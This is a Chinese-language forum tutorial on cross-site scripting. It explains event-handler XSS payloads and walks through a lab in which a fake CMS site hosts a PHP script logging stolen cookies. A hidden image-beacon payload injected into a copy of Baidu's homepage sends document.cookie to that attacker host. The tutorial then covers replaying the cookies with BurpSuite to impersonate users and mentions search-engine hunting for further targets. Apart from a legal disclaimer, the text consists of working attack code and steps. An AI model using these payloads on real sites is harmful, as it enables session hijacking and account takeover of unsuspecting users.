
![](https://bbs.kanxue.com/upload/attach/201504/533967_sk1iwejbr2hzvmr.jpg)

# 事件触发注意事项

注意，当`input`元素的`type`属性为`text`，即文本输入框时，使用`onerror`事件来承载攻击载荷会没有效果，

这意味着下面这个注入结果不会弹出提示框：

```
<input type = "text" name ="search" id ="search" value = ""onerror = alert('利用事件处理程序的xss!')//" class = "text_area"/>
```

因为文本框与“鼠标移动”，“鼠标点击”密切相关，所以应该使用`onmousemove`，`onfocus`等事件来触发攻击载荷；`onerror`常用于`img`元素的事件属性中，典型注入法如下所示：

```
<img src="#" onerror=alert('xss')></img>
```

`onerror`定义的事件，通过页面载入该元素时触发。

上面这些都是开胃小菜，下面来看一个模拟真实环境下通过注入XSS攻击载荷，窃取`cookie`的例子：

## 攻击环境模拟

模拟的受害用户机器：IP 为`192.168.1.50`，测试浏览器为FireFox与IE （因为chrome的安全性比较好，默认设置不允许`javascript`脚本跨域读取，发送`cookie`，因此这里没有给出chrome的测试结果）

模拟用于接收受害用户`cookie`的恶意`web`站点（基于Vmware `windows 7`虚拟机环境）：IP 为`192.168.1.200`，站点架构为Apache + PHP + MySQL，使用织梦CMS建站系统伪装成合法站点，在站点的根目录下有一个叫做`StolenCookie.php`的文件，专门用来接收用户的`cookie`并存储在相同目录下的一个文本文件中，利用其中记录的信息，攻击者就可以窃取到受害用户的会话令牌，结合BurpSuite的Repeater模块，或者传统的桂林老兵`cookie`欺骗工具，可以在不知道用户的帐户密码的情况下，以该用户权限登陆目标站点，如果后者是一个社交网站，那么利用该用户的人脉以及信用度，就可以扩大攻击范围，例如执行社会工程学攻击；在公开访问的“赞”页面中嵌入XSS蠕虫进行传播等等。

## 搭建恶意站点

让我们一步一步来，首先，在虚拟机中搭建`web`站点。这里使用`PHPnow-1.5.6`，

它集成了Apache `web`服务器，PHP中间件解释环境，MySQL数据库。通过任何`web`搜索引擎即可找到它的官方下载页面，下载到本地后，解压`PHPnow-1.5.6.zip`到任意路径，进入解压文件夹，以管理员身份运行其中的`Setup.cmd`文件，安装测试环境：

![](https://bbs.kanxue.com/upload/attach/201503/533967_9d32706e04590454.jpg)

这会启动一个基于CMD命令提示符的组件安装向导，首先选择要安装的Apache与MySQL版本，按照默认即可：

![](https://bbs.kanxue.com/upload/attach/201503/533967_7f0a117a7548f1e7.jpg)

选择版本后会在`PHPnow-1.5.6`的解压目录下创建几个子目录，分别用于存储安装的组件：

![](https://bbs.kanxue.com/upload/attach/201503/533967_f5c44fdceee7bf75.jpg)

与此同时，在CMD窗口中会出现提示解压完成，并且要求对站点运行环境执行初始化，建议选择是，可以省去很多手动配置参数的步骤：

![](https://bbs.kanxue.com/upload/attach/201503/533967_e794f7d1b0dac6e7.jpg)

在初始化的过程中，需要用户参与选择相关选项，例如，设置MySQL的`root`帐户密码，并且会启动Apache进程，`windows`会给出提示是否放行Apache通过防火墙，允许后，会在“高级安全防火墙”的入站规则中，添加相应的策略，这样就能放行请求连接Apache监听的TCP `80`端口的入站流量：

![](https://bbs.kanxue.com/upload/attach/201503/533967_1d4ef8123e877cee.jpg)

![](https://bbs.kanxue.com/upload/attach/201503/533967_70f0468ff729eeec.jpg)

初始化结束后，以任意浏览器访问`127.0.0.1`即可打开安装环境的摘要信息页面：

![](https://bbs.kanxue.com/upload/attach/201503/533967_bd45b87dfefe35b2.jpg)

上面这个统计信息页面，实际上是网站根目录下的`index.php`文件的动态执行结果，后面我们下载了织梦CMS建站系统，就可以把`index.php`移动到其它地方作为备份。另外，运行`PHPnow-1.5.6`解压目录下的`PnCp.cmd`文件，可以在CMD界面下管理网站的各个组件，包括停止和重启Apache，启用PHP缓存加速扩展，重设MySQL数据库的`root`帐户密码，启用Apache的日志功能等等：

至此，我们搭建好了最基本的网站运行环境，后面将下载建站系统，构建完整的站点，其实，我们已经有了PHP中间件，可以解释`StolenCookie.php`文件的动态执行结果，从而记录受害用户的`cookie`，不需要额外的CMS，这里下载它的原因是，顺便可以测试CMS中是否存在反射型以及存储型跨站脚本漏洞，还可以进行传统的SQL注入点挖掘测试，分析CMS的源码，找出能够加以利用的编程缺陷，最后通过

`google hacking`（以及`baidu hacking`），寻找那些互联网上使用相同建站系统的`web`站点，进一步对发现的目标渗透测试。

当然，任何未经站点所有者授权的攻击行动都是违法的，本篇文章的目的仅限交流技术，绝非为这些活动提供支持，不承担任何法律责任，再次提醒慎重行事！

## 部署织梦CMS

关于织梦CMS，大家可以从百度搜索到其官方下载站点，由于这个程序的安装，配置比较简单，这里不多着笔墨介绍：

![](https://bbs.kanxue.com/upload/attach/201503/533967_462f1f4f856411e4.jpg)

下载后解压到任意路径，将其中的`uploads`子目录中的所有内容（`uploads`原本意指需要上传到主机托管商处的内容）复制到PHPnow定义的站点根目录下，复制完成后的目录结构如下所示：

![](https://bbs.kanxue.com/upload/attach/201503/533967_15d366d0c2645db1.jpg)

上图中的`StolenCookie.php`文件实现逻辑如下：

```
<?php

$cookie = $_GET['cookie'];

$log = fopen("cookie.txt", "a");

fwrite($log, $cookie);

fclose($log);

?>
```

使用GET方法获取`cookie`，然后在站点根目录下创建一个`cookie.txt`的文本文件，将获取到的`cookie`内容写入该文件中。

## 构造窃取Cookie的载荷

接下来，模拟百度首页被注入窃取用户`cookie`的`javascript`代码（虽然这在现实中不太可能发生，但是有助于理解HTML元素注入以及`cookie`欺骗的工作原理），然后受害用户访问百度首页导致浏览器跨域发送百度设置的`cookie`至我们搭建的恶意站点的情况：

首先以任意浏览器打开百度首页，使用开发者工具查看首页源码，将其复制到文本编辑器（记事本）中，保存成名为`hijackBaidu.html`的文件，编码设置成UTF-8，然后打开该文件，在菜单栏中选择“格式”->“自动换行”，按下`ctrl+F`热键搜索关键字“`baidu.html`”，找到前面的`noscript`标签，这个标签的本意是引入没有`javascript`的首页版本，实现更好的兼容性，但是其URL使用了相对路径，这会导致IE浏览器在本地解析`hijackBaidu.html`文档时出现错误，无法渲染页面。因此，需要将两侧的`noscript`起始与闭合标签，以HTML文档中的注释符号进行标记，如下图所示：

![](https://bbs.kanxue.com/upload/attach/201503/533967_dc55c5a13622fa2b.jpg)

接着搜索HTML文档体，即`body`元素的闭合标签，在文档的结尾处，前面有`script`的闭合标签，这表明在原始的文档中就引入了一些脚本，甚至可以看到直接读写`cookie`的语句：

![](https://bbs.kanxue.com/upload/attach/201503/533967_1f56bae524c787b4.jpg)

下面是攻击载荷的原始内容：

```
img = new Image();

        img.src = "1c0K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0q4Q4x3X3f1J5x3o6m8Q4x3V1k6e0N6r3!0D9k6h3&6o6L8$3!0C8K9h3g2Q4x3X3g2H3K9s2m8Q4x3@1k6U0L8$3!0C8K9h3g2Q4x3@1b7`." +document.cookie;

        img.width = 0;

        img.height = 0;
```

创建一个`img`对象，其`src`属性的值为一个URL，该URL将当前页面`cookie`作为查询字符串提交至`192.168.1.200`，也就是我们基于虚拟机搭建的恶意站点上的`StolenCookie.php`文件，做进一步处理，后者将记录下来的`cookie`保存到本地的`cookie.txt`文件中。另外，`img`对象的宽度与高度都设置为０；实现更强的隐蔽性，因为在类似百度等如此简洁的主页中，任何非常规引入的元素都非常显眼。

这段攻击载荷插入到原始页面后的位置如下图所示：

![](https://bbs.kanxue.com/upload/attach/201503/533967_600b9fa899138638.jpg)

## 测试窃取效果

编辑完成后保存修改，现在，我们将自己扮演成受害者，也就是在`192.168.1.50`的宿主操作系统上用FireFox与 IE浏览器打开这个页面，模拟`cookie`被窃取的效果。

![](https://bbs.kanxue.com/upload/attach/201504/533967_lx7wchht504fh3n.jpg)

![](https://bbs.kanxue.com/upload/attach/201504/533967_nigx9p74wellqld.jpg)

切换到虚拟机中，在本地文件系统的站点根目录下，发现已经生成了一个叫做`cookie.txt`的文件，查看其中内容，即为记录下来的受害用户的`cookie`：

![](https://bbs.kanxue.com/upload/attach/201504/533967_mhodbrjwju99na9.jpg)

IE浏览器的测试结果与上面类似，这里不再赘述；使用`chrome`浏览器测试时，

虽能生成`cookie.txt`，但其内容为空，说明`chrome`能够阻止跨域发送`cookie`的脚本，而FireFox需要安装`noscript`插件并且配置安全策略后，才能实现拦截发送。

补充一点，上面显示FireFox浏览器列出的所有`cookie`的那张截图中，由`baidu.com`域设置的`cookie`只有3个，因为起初是由其它浏览器接收到的HTML文档副本，而FireFox只是渲染这个页面文档而已，即便FireFox因完整渲染的需要而提交HTTP请求，比起直接访问百度首页，前者访问的资源也是不完整的，这就造成了百度只设置了3个`cookie`。如果直接以FireFox访问百度首页（而非渲染其它浏览器从百度服务器接收到的HTML文档），那么服务器应该设置了5个`cookie`。

使用BurpSuite，可以作为HTTP代理在客户端浏览器与`web`服务器之间拦截HTTP请求与响应，查看并修改其中的数据，包括`cookie`，如下所示：

![](https://bbs.kanxue.com/upload/attach/201504/533967_gl6w60b7n8mqsfc.jpg)

![](https://bbs.kanxue.com/upload/attach/201504/533967_vedmr0gstux72ze.jpg)

再次强调，如果攻击载荷能够被注入至某个站点地图中，可以被其它用户访问的公开页面，而该页面又必须经由登陆，验证身份后才能访问，那么存储在`cookie`中，用于识别用户身份和权限的会话令牌（本质上就是加密后的用户名和密码，以及其它的一些个人信息）将被窃取，如果站点同时启用了“记住我”，“保持登陆状态”等功能，那么攻击者通过`cookie`欺骗工具就可以在不需要登陆的情况下，冒充用户身份（即未经授权）访问站点。

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

上传的附件：

- [wKioL1UWVfCQ60GyAAd2htq6L58458.jpg](javascript:void(0);)

  （66.24kb，12次下载）

- [wKioL1UWWR6REOCdAAisHOH\_xCw743.jpg](javascript:void(0);)

  （80.19kb，12次下载）

- [wKioL1UWW86xE8PqAASOBtTc8HI277.jpg](javascript:void(0);)

  （55.63kb，8次下载）

- [wKioL1UWx1-AQvZIAAu3AZusoio371.jpg](javascript:void(0);)

  （128.45kb，6次下载）

- [wKioL1UWy1DTUfLTABAMYFHVGRI936.jpg](javascript:void(0);)

  （105.80kb，10次下载）

- [wKiom1UaS3iAEelJAAJpc5Vt29E934.jpg](javascript:void(0);)

  （22.60kb，8次下载）
